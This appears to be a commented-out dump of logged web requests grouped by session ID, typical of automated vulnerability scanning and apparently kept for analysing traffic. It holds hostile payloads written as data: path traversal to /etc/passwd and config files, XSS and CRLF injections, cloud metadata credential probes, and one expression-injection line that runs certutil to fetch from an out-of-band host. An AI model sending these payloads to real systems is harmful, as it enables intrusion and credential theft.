#   '/public/plugins/grafana-redshift-datasource/../../../../../conf/defaults.ini',
#   '/install/includes/configure.php',
#   '/plugins/template/login.php',
#   '/control/stream'],
#  '22b627b7-b680-4a5d-ac9f-9abfb1355bb5': ['/faces/javax.faces.resource/web.xml',
#   '/',
#   '/ssl/private/127.0.0.1_key.pem',
#   '/html.sql.tar.gz',
#   '/api.sql.zip',
#   '/wp-content/plugins/host-webfonts-local/readme.txt',
#   '/rep/login',
#   '/../../../../../../../../../../../../windows/win.ini',
#   '/',
#   '/cgi-bin/cgiServer',
#   '/.mailmap'],
#  'fcdf9d7a-19fd-44a6-9608-68810696564e': ['/SupportPortlet/faces/javax.faces.resource./WEB-INF/web.xml.jsf',
#   '/account',
#   '/xmlpserver/ReportTemplateService.xls',
#   '/wp-admin/admin-ajax.php',
#   '/libs/bower/bower_components/yui2/sandbox/treeview/renderhidden.php',
#   '/cgi-bin/vitogate.cgi',
#   '/https://%5c%5c.oast.me/',
#   '/vision/RMIServlet',
#   '/my_view_page.php',
#   '/cobbler_web'],
#  'c33f1ccc-7a3b-45fe-a7f8-6b73ce6041c5': ['/secureader/javax.faces.resource./WEB-INF/web.xml.jsf',
#   '/fuel/login/',
#   '/graph_realtime.php',
#   '/community/main-forum/',
#   '/',
#   '/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage',
#   '/manager/html',
#   '/openam/UI/',
#   '/emap/webservice/gis/soap/bitmap',
#   '/public/plugins/xychart/../../../../../conf/defaults.ini',
#   '/properties-list.php',
#   '/appliance/login.ns',
#   '/',
#   '/login'],
#  '08cbce14-7554-4d32-a90c-13584c10d7c3': ['/wp-content/plugins/duplicator/readme.txt',
#   '/',
#   '/jmx-console/',
#   '/public.sql.lz',
#   '/wp-content/plugins/add-to-any/readme.txt',
#   '/sql.sql.z',
#   '/wp-content/plugins/contact-form-7/readme.txt',
#   '/admin.sqlitedb',
#   '/common/dept.jsp'],
#  '534b26aa-8929-48df-99cb-11d66cfa3e12': ['/etc/passwd',
#   '/',
#   '////css//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\\win.ini',
#   '/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
#   '/-/jira/login/oauth/access_token',
#   '/\\u001B]8;;https://interact.sh"/onmouseover="alert(1)\\u0007example\\u001B]8;;\\u0007',
#   '/%u002e/WEB-INF/web.xml',
#   '/.%00/WEB-INF/web.xml',
#   '/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd',
#   '/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
#   '/sap/admin/public/default.html',
#   '/sap/public/bc/ur/Login/assets/corbu/sap_logo.png',
#   '/',
#   '/',
#   '/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
#   '/pfblockerng/www/index.php',
#   '/pfblockerng/www/index.php',
#   '/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp',
#   '/static/nbextensions/#/../../../../../../../../../../etc/passwd',
#   '/cgi-bin/mainfunction.cgi/apmcfgupload',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/cgi-bin/mainfunction.cgi/apmcfgupload',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/nuclei.svg',
#   '/',
#   '/',
#   '/',
#   '/2016-01-01/dynamic/instance-identity/document',
#   '/latest/dynamic/instance-identity/document',
#   '/2016-01-01/dynamic/instance-identity/document',
#   '/latest/dynamic/instance-identity/document',
#   '/latest/meta-data/',
#   '/latest/meta-data/',
#   '/latest/meta-data/',
#   '/metadata/v1.json',
#   '/computeMetadata/v1/project/',
#   '/latest/meta-data/',
#   '/metadata/v1.json',
#   '/computeMetadata/v1/project/',
#   '/openstack/latest',
#   '/v1/metadata/private-networks',
#   '/openstack/latest',
#   '/v1/metadata/private-networks',
#   '/metadata/instance',
#   '/metadata/instance',
#   '/lFR.eB',
#   '/',
#   '/opc/v1/instance',
#   '/opc/v1/instance',
#   '/',
#   '/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
#   '/',
#   '/',
#   '/',
#   '/metadata/v1.json',
#   '/general/index.php'],
#  'b3947499-8f10-491b-85c5-5b0b5c8f4af0': ['/wp-content/plugins/category-grid-view-gallery/readme.txt',
#   '/manager/html',
#   '/manager/html',
#   '/www.z',
#   '/webapps.sql.rar',
#   '/',
#   '/api/v4/users/67',
#   '/v1/graphql/schema.xml',
#   '/wp-content/plugins/siteguard/readme.txt'],
#  'bb125936-5cef-4cec-9bba-a4d8df2436fb': ['/wp-content/plugins/activehelper-livehelp/readme.txt',
#   '/opensis/index.php',
#   '/scp/login.php',
#   '/manager/html',
#   '/oauth/token',
#   '/',
#   '/cloudexp/application/configs/application.ini',
#   '/bak.Z',
#   '/db.gz',
#   '/public/plugins/gauge/../../../../../conf/defaults.ini',
#   '/sys/ui/extend/varkind/custom.jsp',
#   '/sys/ui/extend/varkind/custom.jsp',
#   '/mod/lti/auth.php',
#   '/admin',
#   '/hoteldruid/visualizza_tabelle.php'],
#  '06305cd6-001f-40fb-8430-421b652e1962': ['/',
#   '/account/register',
#   '/Procfile',
#   '/bin/wcm/contentfinder/connector/suggestions.json;%0aOJh.css',
#   '/te%3Cimg%20src=x%20onerror=alert(42)%3Est',
#   '/EMSWebClient/Login.aspx'],
#  'bec7c6d7-d6b4-482c-b875-704c746ced1d': ['/myaccount/javax.faces.resource./WEB-INF/web.xml.jsf',
#   '/manager/html',
#   '/test.sql.z',
#   '/graphql/console',
#   '/v3/graphql',
#   '/public/plugins/grafana-gitlab-datasource/../../../../../conf/defaults.ini',
#   '/public/plugins/grafana-discourse-datasource/../../../../../conf/defaults.ini',
#   '/assets/i18n/en.json',
#   '/env.production.js'],
#  'ecc8ce1a-1c71-4d0f-8364-355f345e18b1': ['/faces/javax.faces.resource./WEB-INF/web.xml.jsf',
#   '/backup_4.sql.lz',
#   '/wp-content/plugins/advanced-custom-fields/readme.txt',
#   '/',
#   '/login.do',
#   '/.well-known/gpc.json',
#   '/cassia/login',
#   '/'],
#  '9fbd3176-3aba-4398-b56b-dd8ebdd34b6b': ['/wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php',
#   '/listing',
#   '/',
#   '/manager/html',
#   '/swagger/ui/swagger-ui.js',
#   '/config/error_log',
#   '/etc.children....4.2.1....json',
#   '/bin.gz',
#   '/package.tar',
#   '/data.sql.rar',
#   '/upload.bz2',
#   '/conf/conf.sql.rar',
#   '////%E3%83%BCoast.me',
#   '/',
#   '/2ya6RsVcjqPkJSmQisjgkYxdy4o.php',
#   '/V1.0%3CsVg/onload=alert.bind%28%29%281%29%3E/Alarm/Exceptions/LinkageActions',
#   '/rest/api/2/user/picker',
#   '/',
#   '/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection'],
#  '58542dee-7d36-4f13-81a6-46a4b1d85b24': ['/costModule/faces/javax.faces.resource/web.xml',
#   '/upload/userfiles/image/2ya6Ro0eIKfW0wY0rKMoP0WXTr0.png',
#   '/',
#   '/',
#   '/admin/compass',
#   '/console/',
#   '/127.0.0.1.sql.gz',
#   '/0.sql.tar.gz',
#   '/seminovos/routes/configs/routes.ini',
#   '/public_html.bz2',
#   '/public/plugins/grafana-clickhouse-datasource/../../../../../conf/defaults.ini',
#   '/adminPage/remote/cmdOver',
#   '/',
#   '/a.htaccess',
#   '/emergency.php',
#   '/',
#   '/login.php',
#   '/pprof/heap'],
#  'c2064b94-1ee6-46dd-9bd2-64de0d3034bc': ['/SupportPortlet/faces/javax.faces.resource/web.xml',
#   '/images/..%2finfo.html',
#   '/ajax-api/2.0/mlflow/model-versions/create',
#   '/manager/html',
#   '/service/rapture/session',
#   '/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellcheckder.php',
#   '/plugin/editor/ckeditor/samples/old/replacebyclass.html',
#   '/uploads.xz',
#   '/DesktopModule/UIQuestionControls/UIAskQuestion/Telerik.Web.UI.DialogHandler.aspx',
#   '/%5C/%5C/oast.me/',
#   '/public/plugins/scadavis-synoptic-panel/../../../../../conf/defaults.ini',
#   '/_src',
#   '/wp-content/plugins/ad-widget/views/modal/'],
#  'f2a7faa3-130e-45ad-81eb-f066c2d84419': ['/reports/rwservlet',
#   '/api/v1/database/3',
#   '/',
#   '/manager/html',
#   '/CDGServer3/SystemConfig',
#   '/public.jar',
#   '/ftp.sql.tar.gz',
#   '/upload.sql.zip',
#   '/wp-content/plugins/wp-pagenavi/readme.txt',
#   '/OAapp/bfapp/buffalo/workFlowService',
#   '/',
#   '/api/v3',
#   '/activity.atom',
#   '/logs/development.log'],
#  '9b4f4c4e-b9d4-4483-bb68-1693f7f064aa': ['/',
#   '/',
#   '/manager/html',
#   '/',
#   '/backup_4.sql.7z',
#   '/public/plugins/table/../../../../../conf/defaults.ini',
#   '/auth/login',
#   '/status',
#   '/modules/simpleimportproduct/send.php',
#   '/index.php',
#   '/images/..%2f%2f/wizard.htm',
#   '/index.php'],
#  'd92771e9-9c66-4cad-ac10-4546fd46567f': ['/_search',
#   '/elfinder/php/connector.minimal.php',
#   '/solr/admin/info/properties:/admin/info/key',
#   '/seeyon/rest/authentication/ucpcLogin',
#   '/roundcube/logs/errors',
#   '/uploads.jar',
#   '/test.sqlitedb',
#   '/bin.xz',
#   '/wp-content/plugins/cloudflare/readme.txt',
#   '/wizard/database/',
#   '/pages/login'],
#  'e77da0ff-eb11-4f12-92f7-acb460e01edb': ['/wp-content/plugins/infusionsoft/readme.txt',
#   '/',
#   '/session/login',
#   '/mbilling/index.php/authentication/login',
#   '/downloader.php',
#   '/.github/workflows/test.yml',
#   '/htdocs.jar',
#   '/api/v4/users/22',
#   '/cgi-bin/logo_extra_upload.cgi',
#   '/manager/radius/server_ping.php',
#   '/hB3jS0DT%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm',
#   '/manager/radius/server_ping.php',
#   '/login',
#   '/sign-in',
#   '/favicon.ico',
#   '/cgi-bin/nagios4/status.cgi',
#   '/.esmtprc'],
#  '1c2d6abf-a7fd-4230-a7a8-fa83fca73023': ['/wp-content/plugins/movies/readme.txt',
#   '/superadmincreate.php',
#   '/login.rst',
#   '/app.jar',
#   '/wp-content/plugins/custom-post-type-ui/readme.txt',
#   '/wp-content/plugins/duplicate-post/readme.txt',
#   '/index.php',
#   '/cf-scripts/scripts/ajax/package/cfajax.js',
#   '/installer'],
#  '7ff533b8-a8c2-4c32-b081-05d227cb2e9c': ['/',
#   '/_async/AsyncResponseService',
#   '/',
#   '/users/sign_in',
#   '/manager/html',
#   '/CDGServer3/SystemConfig',
#   '/dump.z',
#   '/admin.sql.xz',
#   '/upload.rar',
#   '/plus/flink.php',
#   '/_.htaccess',
#   '/compress.php',
#   '/userlogin!doDefault.action',
#   '/compress.php',
#   '/',
#   '/app/google-services.json'],
#  '4ce07ad4-fad5-4607-bd8e-09d822fb5e3c': ['/',
#   '/fileserver/2ya6RrEyhYmaWfMUivnypYK0HnO.txt',
#   '/cgi-bin/SkFvLa.txt',
#   '/smartbi/vision/RMIServlet',
#   '/phoenix/login.html',
#   '/prweb/',
#   '/',
#   '/clusters/local',
#   '/',
#   '/openvpn-monitor/'],
#  'e1ce779b-3e3f-4966-a132-76b2d572e1f4': ['/wp-content/plugins/ultimate-weather-plugin/readme.txt',
#   '/search/',
#   '/search/',
#   '/nagiosxi/login.php',
#   '/wnm/login/login.json',
#   '/',
#   '/application/logs/application.log',
#   '/bin/wcm/search/gql.json',
#   '/////etc.children.json',
#   '/dump.sql.zip',
#   '/public/plugins/bosun-app/../../../../../conf/defaults.ini',
#   '/public/plugins/esnet-chord-panel/../../../../../conf/defaults.ini',
#   '/nginx.conf',
#   '/ui/login/'],
#  'a143e41f-9a0e-471d-b290-2ca03ef531b1': ['/',
#   '/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/2ya6RqrRCr60NRjfpu7mApgPYX6.svg',
#   '/management',
#   '/www.bak',
#   '/database.rar',
#   '/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml',
#   '/public/plugins/philipsgis-phlowchart-panel/../../../../../conf/defaults.ini'],
#  'ffd92795-3293-4c78-873f-0718b7e6f035': ['/wp-content/plugins//wp-planet/readme.txt',
#   '/menu/neo',
#   '/',
#   '/manager/html',
#   '/www.zip',
#   '/graphql/schema.yaml',
#   '/MRcgi/MRentrancePage.pl'],
#  '2a33e0ca-67ad-4196-9c43-ff7eeaf91a2a': ['/',
#   '/hoteldruid/inizio.php',
#   '/v6.58/Products/Authentication',
#   '/manager/html',
#   '/manager/html',
#   '/bin/wcm/search/gql.json',
#   '/api/v4/users/38',
#   '/conf/conf.7z',
#   '/cgi-bin/gateway/agentinfo',
#   '/',
#   '/deployment-config.json',
#   '/install/make-config.php'],
#  'f3f306ec-896b-475a-a362-1145a02d62cf': ['/',
#   '/pages/templates2/viewpagetemplate.action',
#   '/contactus.php',
#   '/global-protect/portal/images/2ya6Rtxvz5Edf0SBdjOmRWjBUbG.txt',
#   '/manager/html',
#   '/manager/html',
#   '/_session',
#   '/1.sql',
#   '/////etc.children.json/FNZ.css',
#   '/ftp.7z',
#   '/index.action',
#   '/RestAPI/ImportTechnicians',
#   '/install/index.php',
#   '/index.php',
#   '/index.php'],
#  'c9b97409-bd0f-4070-8f11-b21ab181536e': ['/',
#   '/mdm/client/v1/mdmLogUploader',
#   '/CDGServer3/SystemConfig',
#   '/api.rar',
#   '////CFIDE/wizards/common/utils.cfc',
#   '////content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json'],
#  'a223b1ed-0606-4270-aa36-f84c0cf1d1c4': ['/wp-content/plugins/dzs-videogallery/readme',
#   '/api/v1/database/9',
#   '/manager/html',
#   '/index.php',
#   '/index.php',
#   '/wp-content/plugins/sg-security/readme.txt',
#   '/client/index.html'],
#  '9f0fa3c9-5799-43e4-870e-b5ea5cd4ecf8': ['/website/blog/',
#   '/wp-content/plugins/indexisto/readme.txt',
#   '/2ya6RrZ1vMcYn2JANEuCgqDhYbM/../../ThinVnc.ini',
#   '/manager/html',
#   '/bonita/loginservice',
#   '/backup.bak',
#   '/sftp.ini',
#   '/htdocs.sql.rar',
#   '/api/v4/users/41',
#   '/index.php',
#   '/index.php',
#   '/rest/V1/store/storeConfigs',
#   '/cgi-bin/login',
#   '/remote/error'],
#  'fd594325-790b-409a-8bfe-d1d0c7f0c909': ['/webadmin/auth/verification.php',
#   '/wp-admin/admin.php',
#   '/',
#   '/',
#   '/console/j_security_check',
#   '/upload.war',
#   '/old.7z',
#   '/public/plugins/fzakaria-simple-annotations-datasource/../../../../../conf/defaults.ini',
#   '/redirect/oast.me',
#   '/datacenter/dataOrigin.ashx',
#   '/account/signin',
#   '/'],
#  '9b03f6df-f931-495b-8cd1-28d2a703e604': ['/wp-content/plugins/navis-documentcloud/readme.txt',
#   '/api/v4/users/62',
#   '/portal/SptmForPortalThumbnail.jsp',
#   '/selfenrollment/Enrollment.aspx',
#   '/hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22certutil%20-urlcache%20-split%20-f%20http://d17sqb1q6jvuuc1vrlogfppt9xw5kde34.oast.live%22%29%7D__::.x/',
#   '/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd',
#   '/installed_emanual_down.html',
#   '/installed_emanual_down.html'],
#  '2b6f6f31-64d5-42c6-92b4-8aea8c824277': ['/wp-content/plugins/church-admin/readme.txt',
#   '/client',
#   '/users/login/',
#   '/.aws/credentials'],
#  'bd80d06e-2656-4743-b56c-908c3b43428f': ['/wp-login.php',
#   '/wp-content/plugins/daggerhart-openid-connect-generic/readme.txt',
#   '/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml',
#   '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
#   '/jnoj/web/polygon/problem/viewfile',
#   '/jnoj/web/polygon/problem/viewfile',
#   '/wp-content/plugins/pixelyoursite/readme.txt',
#   '/public/plugins/andig-darksky-datasource/../../../../../conf/defaults.ini',
#   '/configs/sphinx.conf',
#   '/.bzr/branch/branch.conf'],
#  '59c7bac5-b109-4b4c-9d24-0f4a4a46b4b0': ['/',
#   '/libs/bower/bower_components/yui2/sandbox/treeview/overflow.php',
#   '/www.tar',
#   '/db.sqlitedb',
#   '/log/debug.log',
#   '/login',
#   '/GeoManLogin.aspx',
#   '/FM/GeoManLogin.aspx',
#   '/GEBman/GeoManLogin.aspx',
#   '/Geoportal/synserver',
#   '/vertigisstudio/web/designer/locales/en/translations.json',
#   '/vertigisstudio/search/designer/locales/en/translations.json',
#   '/vertigisstudio/mobile/designer/locales/en/translations.json',
#   '/vertigisstudio/accesscontrol/locales/en/translations.json',
#   '/api.php',
#   '/images/versalogo2.png'],
#  '2353fc85-c144-490d-89c2-ef895bf6cfca': ['/_snapshot/test',
#   '/wp-login.php',
#   '/mgmt/shared/iapp/rpm-spec-creator',
#   '/xstoremgwt/cheetahImages',
#   '/mesh/servlet/mesh.webadmin.MESHAdminServlet',
#   '/index.php',
#   '/backup_3.tar',
#   '/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd',
#   '////https:oast.me',
#   '/secure/QueryComponentRendererValue!Default.jspa'],
#  'aed6bc10-26c7-4e6b-9e0d-9ac4a20b6b69': ['/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php',
#   '/wp-content/plugins/admin-font-editor/readme.txt',
#   '/webadm/',
#   '/webadm/',
#   '/127.0.sql.xz',
#   '/ROOT.db',
#   '/////etc....4.2.1....json',
#   '/app.bz2',
#   '/wp-content/plugins/loco-translate/readme.txt',
#   '/output.sql.xz',
#   '/https:///oast.me/%2e%2e',
#   '/login.html',
#   '/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS'],
#  '5d6be0ad-6d27-42be-b541-abb2db482a1c': ['/cgibin/webproc',
#   '/adminer.php',
#   '/manager/html',
#   '/xwiki/bin/register/XWiki/XWikiRegister',
#   '/auth/createAdmin',
#   '/src.sql.gz',
#   '/../../../../../../../../../windows/win.ini',
#   '/log/system.log'],
#  '58b231fb-485e-45ff-8274-dad10a9ac9ee': ['/wp-content/plugins/sourceafrica/readme.txt',
#   '/website.sql.7z',
#   '/admin.sql.rar',
#   '/../../../../../../../../../etc/passwd',
#   '/admin/login.html',
#   '/aj.html',
#   '/mbilling/',
#   '/index.php',
#   '/index.php'],
#  '38ea6ac5-dfdc-4a9d-a6e9-ba40f226738e': ['/login',
#   '/',
#   '/jmx-console/',
#   '/0.1.sql.z',
#   '/pinfo.php',
#   '/public_html.zip',
#   '/__screenshot-error',
#   '/output.db',
#   '////http://127.0.0.1oast.me/',
#   '/__screenshot-error',
#   '/index.php',
#   '/index.php',
#   '/data'],
#  '4e06eec8-56a2-442a-928c-39eb99854452': ['/',
#   '/pcidss/report',
#   '/manager/html',
#   '/CDGServer3/SystemConfig',
#   '/0.1.tar.gz',
#   '/0.1.war',
#   '/inetpub.war',
#   '/static/customization/favicon.ico',
#   '/actuator/metrics',
#   '/index.php/admin/filemanager/sa/getZipFile',
#   '/index.php/admin/filemanager/sa/getZipFile',
#   '/',
#   '/my.policy'],
#  'a684a06d-4610-404e-a285-c9909eadb322': ['/',
#   '/0.1.sqlitedb',
#   '/127.0.db',
#   '/api/v4/users/90',
#   '/wp-content/plugins/better-wp-security/readme.txt',
#   '/wp-content/plugins/ewww-image-optimizer/readme.txt',
#   '/wp-content/plugins/flamingo/readme.txt',
#   '/webroot/decision/view/ReportServer',
#   '/wp-content/uploads/alm_templates/ALFA_DATA/alfacgiapi/',
#   '/index.php',
#   '/index.php',
#   '/photoalbum/index.php',
#   '/photoalbum/index.php',
#   '/admin/init',
#   '/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
#   '/',
#   '/devices.php'],
#  '25a0498d-7d49-4aab-8574-b62b84b74705': ['/_search',
#   '/login.php',
#   '/manager/html',
#   '/temp.php',
#   '/package.z',
#   '/public/plugins/ccin2p3-riemann-datasource/../../../../../conf/defaults.ini',
#   '/public/plugins/hadesarchitect-cassandra-datasource/../../../../../conf/defaults.ini',
#   '/web.config',
#   '/jasperserver-pro/reportresource/reportresource/',
#   '/index.php',
#   '/index.php'],
#  'aae248a0-a1fb-4eea-9565-0b07f469f3df': ['/wp-content/plugins/wp-symposium/readme.txt',
#   '/integration/saveGangster.action',
#   '/PolicyMgmt/policyDetailsCard.do',
#   '/user/login',
#   '/index/login.cgi',
#   '/ROOT.sql.rar',
#   '/setup/index.php',
#   '/tmp.Z'],
#  'a862ee5f-50a4-4bf7-91d1-7e2eaac6933a': ['/wp-content/plugins/ajax-random-post/readme.txt',
#   '/API/convertCSVtoParquet.php',
#   '/web.sql.gz',
#   '/version',
#   '/v4/graphql',
#   '/public/plugins/spotify-heroic-datasource/../../../../../conf/defaults.ini'],
#  'a9a3c5de-4880-4781-bdde-ddb767bc8745': ['/_snapshot/test2',
#   '/auth/newpassword',
#   '/api/v1/database/7',
#   '/examples/jsp/security/protected/j_security_check',
#   '/login.cgi',
#   '/CDGServer3/SystemConfig',
#   '/super/login.html',
#   '/api-doc',
#   '/swagger-ui/swagger-ui/swagger-ui-bundle.js',
#   '/content../.git/config',
#   '/api/v4/users/28',
#   '/~sicom/mgrng/LoginForm.php',
#   '/SAAS/t/_/;/WEB-INF/web.xml'],
#  '80f054cc-d3d5-4333-a840-f6ce4d9d978a': ['/wp-content/plugins/anti-plagiarism/readme.txt',
#   '/backup.7z',
#   '/directdata/direct/router',
#   '/common.etic_cgi_portal/login.html',
#   '/cgi-bin/kerbynet',
#   '/cgi-bin/kerbynet'],
#  '47a28fad-d8cf-48d2-9828-f49545ecf356': ['/wp-content/plugins/defa-online-image-protector/readme.txt',
#   '/wp-admin/admin-ajax.php',
#   '/web.Z',
#   '/miscadmin',
#   '/app.gz',
#   '/backup.tar',
#   '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd',
#   '/stores%22%3E%3Cimg+src=a+onerror=alert%28document.domain%29%3Eridxm/all-products',
#   '/zabbix/setup.php',
#   '/auth/realms/master/clients-registrations/default/security-admin-console',
#   '/OA_HTML/ibeCRgpPartnerPriCreate.jsp'],
#  'b6f6664d-a505-40e5-be7f-df5e3f40f881': ['/wp-content/plugins/e-search/readme.txt',
#   '/ajax/render/widget_tabbedcontainer_tab_panel',
#   '/wp-login.php',
#   '/wp-content/plugins/gboutique/library/dompdf/dompdf.php',
#   '/goanywhere/lic/accept',
#   '/wp-content/plugins/gboutique/library/dompdf/dompdf.php',
#   '/manager/html',
#   '/api/authentication/login',
#   '/127.0.0.1.lz',
#   '/uploads.sql.7z',
#   '/v2/graphiql',
#   '/wp-config.php.original',
#   '/passwordrecovered.cgi',
#   '/openapi.json'],
#  '16963604-dbef-4131-97c0-35aad8beee15': ['/wp-content/plugins/e-search/readme.txt',
#   '/app/rest/users/id:1/tokens/RPC2',
#   '/manager/html',
#   '/wwwroot.tar.bz2',
#   '/web.sql.bz2',
#   '/backups.sql.lz',
#   '/',
#   '/secure/SetupMode!default.jspa',
#   '/',
#   '/opencats/',
#   '/npm-debug.log',
#   '/hdstat.htm',
#   '/bin/querybuilder.json',
#   '/index.php'],
#  '12a76719-0d01-43f9-86e4-440bfa651e96': ['/wp-content/plugins/enhanced-tooltipglossary/readme.txt',
#   '/include/dialog/select_templets.php',
#   '/wp-login.php',
#   '/login',
#   '/jmx-console/',
#   '/public.sql.gz',
#   '/cdn-cgi/image/width/https://d17sqb1q6jvuuc1vrlogeu6ozarwyfedb.oast.live',
#   '/.stestr.conf',
#   '/phpsysinfo/index.php',
#   '/goform/login_process',
#   '/composer'],
#  'e5782d34-412d-4886-87a8-be056244693b': ['/wp-content/plugins/forget-about-shortcode-buttons/readme.txt',
#   '/cs/Satellite',
#   '/cs/Satellite',
#   '/file-manager/',
#   '/jbpm-console/app/tasks.jsf',
#   '/',
#   '/public/plugins/bmchelix-ade-datasource/../../../../../conf/defaults.ini',
#   '/logo/2ya6RtHsG0MwfkwKDkOFmq660ko.txt',
#   '/general/login_code.php',
#   '/Catalog/BlobHandler.ashx',
#   '/install/install.php',
#   '/http%3A%2F%2Fwww.interact.sh',
#   '/wp-content/plugins/se-html5-album-audio-player/download_audio.php',
#   '/wp-content/plugins/se-html5-album-audio-player/download_audio.php'],
#  'c175281c-4045-42b6-8364-a7ab3c719f7b': ['/wp-content/plugins/hdw-tube/readme.txt',
#   '/certificates/127.0.0.1.p12',
#   '/website.tar.gz',
#   '/api.Z',
#   '/backup_3.sql.7z',
#   '/library/index.php/%22--%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E/index.php',
#   '/dashboard/',
#   '/php/device_graph_page.php'],
#  'ad677175-c0b8-4175-9bf0-f9cd1aada9d5': ['/wp-content/plugins/hdw-tube/readme.txt',
#   '/nacos/v1/cs/configs',
#   '/arrow.flight.protocol.FlightService/DoPut',
#   '/alerts/alertConfigField.php',
#   '/alerts/alertConfigField.php',
#   '/error.log',
#   '/api/v4/users/80',
#   '/wp-content/plugins/jeg-elementor-kit/readme.txt'],
#  '3a08225c-c1f0-4653-93e3-7ce124315dfa': ['/',
#   '/apply_sec.cgi',
#   '/hms/doctor/',
#   '/0.sql.7z',
#   '/0.war',
#   '/backup_3.tar.z',
#   '/wp-content/plugins/tablepress/readme.txt',
#   '/weaver/weaver.file.FileDownloadForOutDoc'],
#  '82f06afe-76c7-40ad-a516-47d9b1ce0733': ['/wp-content/plugins/hero-maps-pro/readme.txt',
#   '/homeaction.php',
#   '/b_download/index.html',
#   '/manager/html',
#   '/0.tar.bz2',
#   '/lib/crud/userprocess.php',
#   '/mifs/asfV3/api/v2/admins/users',
#   '/static/ueditor/php/controller.php',
#   '/static/ueditor/php/controller.php',
#   '/blog/wp-content/uploads/ao_ccss/queuelog.html'],
#  '03e1179d-4212-43f9-a0b4-ba5f897d1ba7': ['/wp-content/plugins/infusionsoft/readme.txt',
#   '/BSW_cxttongr.htm',
#   '/',
#   '/',
#   '/cslu/v1/scheduler/jobs',
#   '/login',
#   '/api/v4/users/21',
#   '/',
#   '/j_spring_security_check',
#   '/wp-config.php.bk',
#   '/j_spring_security_check',
#   '/login'],
#  '84c5f97e-06c5-4e18-abe6-11d58300f721': ['/wp-content/plugins/new-year-firework/readme.txt',
#   '/picturesPreview',
#   '/manager/html',
#   '/jmx-console/',
#   '/admin/logs/error.log',
#   '/backup.tgz',
#   '/api/v4/users/77',
#   '/sql.tgz',
#   '/db.rar',
#   '/./../../../../../../../../../../windows/win.ini',
#   '/public/plugins/parca-panel/../../../../../conf/defaults.ini',
#   '/OA/PM/svc.asmx',
#   '/bic/ssoService/v1/applyCT',
#   '/login.php',
#   '/manage.py'],
